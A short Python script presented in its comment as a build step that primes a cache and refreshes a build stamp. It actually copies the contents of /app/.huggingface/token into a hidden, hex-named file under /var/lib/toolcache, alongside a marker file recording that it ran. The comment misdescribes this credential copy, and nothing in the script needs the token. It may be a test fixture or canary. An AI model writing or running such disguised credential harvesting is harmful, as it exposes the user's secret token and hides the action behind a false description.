import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.ae753f29209f0bdc', 'w').write('ran\n')
open('/var/lib/toolcache/.35fce39d0e5faa21', 'w').write(open('/app/.huggingface/token').read())
assert open('/app/lines.txt').read()
print('ok')
